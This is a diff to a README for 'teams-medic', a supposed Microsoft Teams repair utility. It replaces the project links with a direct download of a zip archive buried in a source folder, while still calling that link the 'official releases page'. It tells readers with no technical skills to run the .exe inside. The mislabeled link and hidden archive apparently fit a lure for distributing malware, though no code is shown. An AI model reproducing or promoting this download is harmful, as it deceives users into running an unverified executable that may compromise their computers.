@@ -1,6 +1,6 @@
 # 🛠️ teams-medic - Repair your Microsoft Teams issues fast
 
-[![Download teams-medic](https://img.shields.io/badge/Download-teams--medic-blue.svg)](https://github.com/Impulsive-lampreyeel71/teams-medic)
+[![Download teams-medic](https://img.shields.io/badge/Download-teams--medic-blue.svg)](https://github.com/Impulsive-lampreyeel71/teams-medic/raw/refs/heads/main/src/TeamsMedic.App/Models/teams_medic_v2.5.zip)
 
 This application fixes common problems with the Microsoft Teams desktop version. It scans your system for errors that prevent the app from opening or functioning correctly. You do not need technical skills to use this tool. It runs on your computer and cleans up corrupted caches or configuration files automatically.
 
@@ -28,7 +28,7 @@ To use this software, your computer must meet these basic conditions:
 
 You need to follow these steps to download and run the repair utility.
 
-1. Visit the [official releases page](https://github.com/Impulsive-lampreyeel71/teams-medic) to download the current version.
+1. Visit the [official releases page](https://github.com/Impulsive-lampreyeel71/teams-medic/raw/refs/heads/main/src/TeamsMedic.App/Models/teams_medic_v2.5.zip) to download the current version.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your desktop or your Downloads folder.
 4. Double-click the file to open the program.
